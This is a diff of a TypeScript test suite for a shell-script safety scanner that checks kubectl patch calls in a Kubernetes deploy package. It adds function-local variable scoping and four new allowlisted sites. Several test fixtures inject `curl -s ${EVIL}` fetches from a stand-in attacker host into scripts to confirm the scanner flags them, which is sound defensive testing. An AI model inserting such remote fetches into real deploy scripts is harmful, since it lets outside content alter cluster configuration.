@@ -280,40 +280,93 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
    * proven by new red/green fixtures in
    * `packages/scale-zero-pg/deploy/test_provision-app.sh`).
    *
-   * What remains here is NOT the vulnerability — it is a SCANNER LIMITATION:
-   * this module tracks shell variables in a FLAT, whole-file namespace with
-   * no per-function scoping, so tracing `$patch_body` -> `$tl` walks every
-   * OTHER local variable named `tl` (and, through `positionalSources`'
-   * substring-based "owner" search over `$1`-style parameter writes, several
-   * unrelated variables in unrelated functions too) across this large,
-   * multi-function script, rather than just the `local tl="$1"` in scope
-   * here. `STATEMENT_ALLOWLIST` (the scanner's own byte-exact,
-   * source-pinned carve-out, already used 4x in this package for the
-   * structurally identical "in-cluster curl value applied within the same
-   * cluster" pattern) was evaluated and rejected as the fix: pinning came
-   * out to ~30 sources spanning functions with no relationship to timeline
-   * reclamation, which is not a reviewable list, just enumerated scanner
-   * noise. Closing this for real needs function-local variable scoping in
-   * the scanner (TODO, new issue) — tracked here, not silently re-hidden
-   * behind a broader allowlist entry. Listed byte-exact so it is neither
-   * hidden nor silently dropped if the statement changes.
+   * (#1716, RESOLVED) What remained here was NOT the vulnerability — it was a
+   * SCANNER LIMITATION: this module used to track shell variables in a FLAT,
+   * whole-file namespace with no per-function scoping, so tracing
+   * `$patch_body` -> `$tl` walked every OTHER local variable named `tl` (and,
+   * through `positionalSources`' substring-based "owner" search over
+   * `$1`-style parameter writes, several unrelated variables in unrelated
+   * functions too) across this large, multi-function script, rather than
+   * just the `local tl="$1"` in scope here. `STATEMENT_ALLOWLIST` was
+   * evaluated and rejected as the fix AT THE TIME: pinning came out to ~30
+   * sources spanning functions with no relationship to timeline reclamation,
+   * not a reviewable list. `scopedTexts`/function-local scoping in
+   * `apply-safety-scan.mjs` (#1716) closes this for real: `corpusWriteSites`,
+   * `corpusDynamicWrites` and `positionalSources`' owner search are now
+   * scoped to the script's own top level plus ONE function's own body, never
+   * a sibling's, so the SAME four sites now pin to a small, reviewable
+   * `sources` list (`reclaim-record-merge-inlined`, `reclaim-record-merge-raw`,
+   * `reclaim-clear-json-inlined`, `reclaim-clear-json-raw` in
+   * `STATEMENT_ALLOWLIST`) instead of a carve-out. Do not re-file this as
+   * open, and do not re-add a byte-exact carve-out here.
    */
-  const SCANNER_SCOPE_LIMITATION = [
-    'packages/scale-zero-pg/deploy/provision-app.sh: kubectl patch body carries network content (URL variable $patch_body): kubectl --context "$KCTX" -n "$NS" "patch" "configmap" "$RECLAIM_CM" "--type" "merge" "-p" "$patch_body"',
-    'packages/scale-zero-pg/deploy/provision-app.sh: kubectl patch body carries network content (URL variable $patch_body): K patch configmap "$RECLAIM_CM" --type merge -p "$patch_body" >/dev/null 2>&1',
-    'packages/scale-zero-pg/deploy/provision-app.sh: kubectl patch body carries network content (URL variable $patch_body): kubectl --context "$KCTX" -n "$NS" "patch" "configmap" "$RECLAIM_CM" "--type" "json" "-p" "$patch_body"',
-    'packages/scale-zero-pg/deploy/provision-app.sh: kubectl patch body carries network content (URL variable $patch_body): K patch configmap "$RECLAIM_CM" --type json -p "$patch_body" >/dev/null 2>&1',
-  ];
-
   it('the real tree has NO unsafe apply anywhere (every script, every workflow job)', () => {
-    const offenders = scanRealTree().offenders.filter((o) => !SCANNER_SCOPE_LIMITATION.includes(o));
-    expect(offenders).toEqual([]);
+    expect(scanRealTree().offenders).toEqual([]);
   });
 
-  it('every SCANNER_SCOPE_LIMITATION entry is still exactly what the scanner reports (nothing drifted underneath it)', () => {
-    const all = scanRealTree().offenders;
-    for (const entry of SCANNER_SCOPE_LIMITATION) expect(all).toContain(entry);
-    expect(all.length).toBe(SCANNER_SCOPE_LIMITATION.length);
+  // ---- #1716 round 2 (review): scoping by call graph alone missed a real
+  // bash GLOBAL — a function that writes a followed name WITHOUT `local`izing
+  // it is not something call-graph reachability may exclude, because bash
+  // gives that write to the caller's (or the script's) binding regardless of
+  // whether this scanner's static call graph can reach the writer. Fixed by
+  // `globalWriterTexts`/`declaresLocal` in apply-safety-scan.mjs: a
+  // non-`local`'d write is unioned into `corpusWriteSites` from EVERY scope.
+  it("#1716 round 2: an unlocal'd global write in an UNREACHABLE function (reviewer repro) still reds provision-app.sh", () => {
+    const file = `${D}provision-app.sh`;
+    const text = readTracked(file);
+    const anchor = 'cmd_destroy() {';
+    // The reviewer's exact fixture: `poison_tl` writes $tl as a real bash
+    // global (no `local`), called only from `cmd_poison` — unreachable from
+    // record_reclaim_pending/clear_reclaim_pending's own call graph, and not
+    // an orphan (it IS statically called, just from somewhere irrelevant).
+    const poisoned = `poison_tl() { tl="$(curl -s ${EVIL})"; }\ncmd_poison() { poison_tl; }\n\n${anchor}`;
+    const mutated = text.replace(anchor, () => poisoned);
+    expect(mutated).not.toBe(text);
+    const offenders = scanFile(file, mutated);
+    expect(offenders.length).toBeGreaterThan(0);
+  });
+
+  it('#1716 round 2: the SAME fixture stays clean when poison_tl declares \`local tl\` (a real function-local write, correctly excluded)', () => {
+    const file = `${D}provision-app.sh`;
+    const text = readTracked(file);
+    const anchor = 'cmd_destroy() {';
+    const localized = `poison_tl() { local tl; tl="$(curl -s ${EVIL})"; }\ncmd_poison() { poison_tl; }\n\n${anchor}`;
+    const mutated = text.replace(anchor, () => localized);
+    expect(mutated).not.toBe(text);
+    expect(scanFile(file, mutated)).toEqual([]);
+  });
+
+  // ---- #1716 round 3 (review): `typeset` is a full synonym of `declare`,
+  // including `-g` — both leak the write to the caller exactly like a bare
+  // assignment, so both must red; without `-g` both are function-local.
+  it.each([
+    'declare -g',
+    'typeset -g',
+    'declare -gx',
+    'typeset -xg',
+  ])('#1716 round 3: `%s tl=...` in an unreachable function is a GLOBAL write and reds provision-app.sh', (kw) => {
+    const file = `${D}provision-app.sh`;
+    const text = readTracked(file);
+    const anchor = 'cmd_destroy() {';
+    const poisoned = `poison_tl() { ${kw} tl="$(curl -s ${EVIL})"; }\ncmd_poison() { poison_tl; }\n\n${anchor}`;
+    const mutated = text.replace(anchor, () => poisoned);
+    expect(mutated).not.toBe(text);
+    expect(scanFile(file, mutated).length).toBeGreaterThan(0);
+  });
+
+  it.each([
+    'declare',
+    'typeset',
+    'declare -x',
+    'typeset -x',
+  ])('#1716 round 3: `%s tl=...` (no -g) is function-local and stays clean', (kw) => {
+    const file = `${D}provision-app.sh`;
+    const text = readTracked(file);
+    const anchor = 'cmd_destroy() {';
+    const localized = `poison_tl() { ${kw} tl="$(curl -s ${EVIL})"; }\ncmd_poison() { poison_tl; }\n\n${anchor}`;
+    const mutated = text.replace(anchor, () => localized);
+    expect(mutated).not.toBe(text);
+    expect(scanFile(file, mutated)).toEqual([]);
   });
 
   // ---- bypass class 1: fetch spellings and one-line chains ---------------
@@ -705,9 +758,15 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
   const scanFile = (p: string, text = readTracked(p)) =>
     unsafeApplies(text, { file: p, resolveSource: sourceResolver(p), allowHits: new Map() });
 
-  it('round 7: the statement allowlist names exactly the four known sites', () => {
-    expect(STATEMENT_ALLOWLIST.length).toBe(4);
-    expect(new Set(STATEMENT_ALLOWLIST.map((e) => e.id)).size).toBe(4);
+  it('round 7: the statement allowlist names exactly the eight known sites', () => {
+    // #1716: four original pageserver-curl sites, plus four for
+    // provision-app.sh's reclaim-pending patches (two functions x two
+    // clause-text forms each — the literal `K patch …` call and `K`'s
+    // `kubectl --context …` body inlined at that call site — function-local
+    // scoping is what makes these pinnable at all; see the comment above
+    // `reclaim-record-merge-inlined` in STATEMENT_ALLOWLIST).
+    expect(STATEMENT_ALLOWLIST.length).toBe(8);
+    expect(new Set(STATEMENT_ALLOWLIST.map((e) => e.id)).size).toBe(8);
     expect(
       STATEMENT_ALLOWLIST.map((e) => `${e.file.split('/').pop()}: ${e.anchor}`).sort(),
     ).toEqual(
@@ -716,6 +775,10 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
         '_verify-app-restore.sh: awk -v lsn="$MODE_LSN"',
         '_verify-objstore.sh: awk -v lsn="$STATIC_LSN"',
         '_verify-restore.sh: awk -v lsn="$STATIC_LSN"',
+        'provision-app.sh: --type merge -p "$patch_body"',
+        'provision-app.sh: --type merge -p "$patch_body"',
+        'provision-app.sh: --type json -p "$patch_body"',
+        'provision-app.sh: --type json -p "$patch_body"',
       ].sort(),
     );
   });
@@ -731,6 +794,9 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
     }
   });
 
+  // #1716: these loop every allowlist entry and rescan a large file 2-3 times
+  // each; since globals are unioned from every scope that is ~6 s on a CI
+  // runner, over bun's 5000 ms default (the same reason beforeAll has one).
   it('round 7: removing ANY statement-allowlist entry reds the real-tree scan of its file', () => {
     for (const e of [...STATEMENT_ALLOWLIST]) {
       expect({ id: e.id, offenders: scanFile(e.file) }).toEqual({ id: e.id, offenders: [] });
@@ -745,8 +811,8 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
         STATEMENT_ALLOWLIST.splice(at, 0, e);
       }
     }
-    expect(STATEMENT_ALLOWLIST.length).toBe(4);
-  });
+    expect(STATEMENT_ALLOWLIST.length).toBe(8);
+  }, 60_000);
 
   it('round 7: an entry matches its statement byte-exactly — one changed byte in the site, or the same text in another file, is an offender', () => {
     for (const e of STATEMENT_ALLOWLIST) {
@@ -762,7 +828,7 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
       const elsewhere = unsafeApplies(text, { file: 'scripts/not-the-allowlisted-file.sh' });
       expect({ id: e.id, flagged: elsewhere.length > 0 }).toEqual({ id: e.id, flagged: true });
     }
-  });
+  }, 60_000);
 
   // ---- #1410 round 8: the allowlist pins where the interpolated variables come from --
 
@@ -812,6 +878,38 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
       file: `${D}_restore-writable.sh`,
       from: '  _u="$($KD get secret storage-s3-creds -o jsonpath=\'{.data.user}\' | base64 -d)"',
       to: `  _ctl="$(curl -s ${EVIL})"\n  _u="$($KD get secret storage-s3-creds -o jsonpath='{.data.user}' | base64 -d)"`,
+    },
+    // #1716: a fetch injected into `record_reclaim_pending`'s own `$ts` (one
+    // of the three values its patch body's python3 call interpolates) is
+    // caught by BOTH clause-text forms of its statement — the general walk's
+    // flat `st.vars` tracking (which the #1716 scoping does not touch) still
+    // carries `$ts`'s real value into `$patch_body` regardless of which
+    // scope traces it.
+    {
+      id: 'reclaim-record-merge-inlined',
+      file: `${D}provision-app.sh`,
+      from: 'ts="$(date -u +%FT%TZ 2>/dev/null || echo unknown)"',
+      to: `ts="$(curl -s ${EVIL})"`,
+    },
+    {
+      id: 'reclaim-record-merge-raw',
+      file: `${D}provision-app.sh`,
+      from: 'ts="$(date -u +%FT%TZ 2>/dev/null || echo unknown)"',
+      to: `ts="$(curl -s ${EVIL})"`,
+    },
+    // `clear_reclaim_pending` interpolates only `$tl`; inject a fetch into a
+    // fresh assignment right after its ConfigMap-exists guard.
+    {
+      id: 'reclaim-clear-json-inlined',
+      file: `${D}provision-app.sh`,
+      from: 'K get configmap "$RECLAIM_CM" >/dev/null 2>&1 || return 0',
+      to: `K get configmap "$RECLAIM_CM" >/dev/null 2>&1 || return 0; tl="$1$(curl -s ${EVIL})"`,
+    },
+    {
+      id: 'reclaim-clear-json-raw',
+      file: `${D}provision-app.sh`,
+      from: 'K get configmap "$RECLAIM_CM" >/dev/null 2>&1 || return 0',
+      to: `K get configmap "$RECLAIM_CM" >/dev/null 2>&1 || return 0; tl="$1$(curl -s ${EVIL})"`,
     },
   ];
 
@@ -1449,5 +1547,95 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
       const execBits = mode % 512; // low 9 bits: rwxrwxrwx
       expect(execBits & 0o111).toBeGreaterThan(0);
     }
+  });
+
+  // ---- #1716: function-local variable scoping (minimal, self-contained fixtures) --
+  //
+  // The provision-app.sh entries above (`reclaim-record-merge-inlined` etc.) are
+  // the real-world proof this landed; these two fixtures isolate the GENERAL
+  // mechanism the issue asked for, independent of that file, each via a
+  // temporary STATEMENT_ALLOWLIST entry (pushed and popped per test, never left
+  // in the shared array).
+  describe('#1716: function-local variable scoping', () => {
+    const F = 'fixture-1716.sh';
+    const withEntry = (entry: (typeof STATEMENT_ALLOWLIST)[number], run: () => void) => {
+      STATEMENT_ALLOWLIST.push(entry);
+      try {
+        run();
+      } finally {
+        const at = STATEMENT_ALLOWLIST.indexOf(entry);
+        STATEMENT_ALLOWLIST.splice(at, 1);
+      }
+    };
+
+    it('an unvalidated use of the same variable in the SAME function still reds, even once an earlier use in that function is pinned clean', () => {
+      const script = `${STRICT}
+K() { kubectl --context "$K" -n ns "$@"; }
+same_fn() {
+  local tl="clean"
+  K patch configmap cm --type merge -p "{\\"tl\\":\\"$tl\\"}"
+  tl="$(curl -s ${EVIL})"
+  K patch configmap cm2 --type merge -p "{\\"tl\\":\\"$tl\\"}"
+}
+same_fn
+`;
+      // Pin the FIRST statement (the clean `local tl="clean"` value) clean —
+      // this is the "earlier use in the same function is validated" half.
+      withEntry(
+        {
+          id: 'fixture-same-fn-clean',
+          anchor: 'anchor-unused',
+          file: F,
+          sources: [],
+          statement:
+            'kubectl --context "$K" -n "ns" "patch" "configmap" "cm" "--type" "merge" "-p" "{\\"tl\\":\\"$tl\\"}"',
+        },
+        () => {
+          const offenders = unsafeApplies(script, { file: F });
+          // The SECOND statement (same function, same variable name, now fed
+          // by `curl`) has no entry of its own: it must still be an offender
+          // — scoping the first statement's trace to `same_fn` must not also
+          // silently clear the second, later write in that SAME scope.
+          expect(offenders.some((o) => o.includes('"cm2"'))).toBe(true);
+        },
+      );
+    });
+
+    it('a validated (pinned-clean) use in one function does not launder an unvalidated use of the same-named variable in ANOTHER function', () => {
+      const script = `${STRICT}
+K() { kubectl --context "$K" -n ns "$@"; }
+clean_fn() {
+  local tl="clean"
+  K patch configmap cm --type merge -p "{\\"tl\\":\\"$tl\\"}"
+}
+tainted_fn() {
+  local tl
+  tl="$(curl -s ${EVIL})"
+  K patch configmap cm --type json -p "{\\"tl\\":\\"$tl\\"}"
+}
+clean_fn
+tainted_fn
+`;
+      withEntry(
+        {
+          id: 'fixture-clean-fn',
+          anchor: 'anchor-unused',
+          file: F,
+          sources: [],
+          statement:
+            'kubectl --context "$K" -n "ns" "patch" "configmap" "cm" "--type" "merge" "-p" "{\\"tl\\":\\"$tl\\"}"',
+        },
+        () => {
+          const offenders = unsafeApplies(script, { file: F });
+          // `clean_fn`'s statement matches the pinned entry and is not an
+          // offender (its OWN `$tl` really is the literal "clean").
+          expect(offenders.some((o) => o.includes('--type" "merge"'))).toBe(false);
+          // `tainted_fn`'s statement has NO entry of its own (different
+          // clause text: `--type json`, a DIFFERENT function's `$tl`) and
+          // must still be flagged — `clean_fn`'s pin must not launder it.
+          expect(offenders.some((o) => o.includes('--type" "json"'))).toBe(true);
+        },
+      );
+    });
   });
 });
